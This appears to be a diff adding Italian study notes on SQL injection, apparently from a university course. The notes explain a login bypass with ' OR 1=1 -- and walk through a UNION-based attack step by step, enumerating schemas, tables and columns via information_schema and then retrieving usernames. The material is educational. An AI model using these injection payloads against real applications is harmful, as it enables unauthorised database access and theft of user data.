@@ -1,0 +1,66 @@
+-> SQL INJECTION -------------------------------------------------------------------
+La SQL Injection è una vulnerabilità di sicurezza che consente ad un attaccante di interferire con le query SQL che un'applicazione invia al suo database. Questo può permettere all'attaccante di visualizzare dati a cui normalmente NON dovrebbe avere accesso, oppure eseguire comandi arbitrari sul database.
+
+-> 1. Tornare un Risultato "VERO"-----------------
+Un attacco SQL Injection può sfruttare l'input dell'utente per manipolare una query SQL in modo che il risultato sia sempre vero.
+
+-> Esempio di Query Vulnerabile:
+SELECT * FROM users WHERE username = 'user' AND password = 'password';
+
+Se l'input dell'utente per il campo username è:
+' OR 1=1 --
+
+La query diventa:
+SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'password';
+	•	' OR 1=1 -- forza la condizione ad essere sempre vera.
+	•	-- commenta il resto della query, ignorando la verifica della password.
+
+-> 2. SQL Union Based Injection-------------------------------------------------------------------
+L'iniezione basata su UNION viene utilizzata per combinare i risultati di più query SQL. Questo può essere sfruttato per recuperare dati da altre tabelle o colonne.
+
+Supponiamo che una query venga eseguita come segue:
+SELECT id, username, email FROM users WHERE id = 1;
+
+-> Passi per Sfruttare UNION Based Injection:
+
+	1 Scoprire il Numero di Colonne: Inietta diverse query con NULL per determinare il numero di colonne nella query originale.
+		' UNION SELECT NULL #
+	 Se dà errore, si deve provare con più colonne: 		' UNION SELECT NULL, NULL, NULL #
+	 Quando NON si verifica errore, si è trovato il numero di colonne.
+
+	2 Sfruttare information_schema: information_schema è uno schema SQL standard che contiene informazioni sulla struttura del database.
+
+-> Scoprire gli Schemi: ' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #
+
+-> Scoprire le Tabelle: ' UNION SELECT NULL, NULL, table_name FROM information_schema.tables #
+
+-> Scoprire le Tabelle di uno Specifico Schema: ' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #
+
+-> Scoprire le Colonne di una Specifica Tabella: ' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #
+
+->Recuperare Dati da una Tabella: ' UNION SELECT NULL, NULL, username FROM users #
+
+
+//------------------------//
+ESEMPIO Dettagliato:
+Supponiamo di voler visualizzare i nomi degli utenti nel database e che l'applicazione esegua questa query:
+SELECT id, username, email FROM users WHERE id = 1;
+
+	1 Scoprire il Numero di Colonne: 		Iniettiamo: 			' UNION SELECT NULL #
+	 		Se c'è un errore, proviamo con: 			' UNION SELECT NULL, NULL, NULL #
+
+		Se non dà nessun errore allora la query originale ha 3 colonne.
+
+	2 Scoprire gli Schemi: 		' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #
+	 		Scopriamo uno schema chiamato unibo.
+
+	3 Scoprire le Tabelle: 		' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #
+		 		Scopriamo tabelle chiamate users e guestbook.
+
+	4 Scoprire le Colonne della Tabella users: 		' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #
+		 		Scopriamo colonne chiamate id, username, email.
+
+	5 Recuperare i Dati dalla Tabella users: 		' UNION SELECT NULL, NULL, username FROM users #
+		 		Otteniamo una lista di utenti: 		ale
+		Pippo
+//------------------//
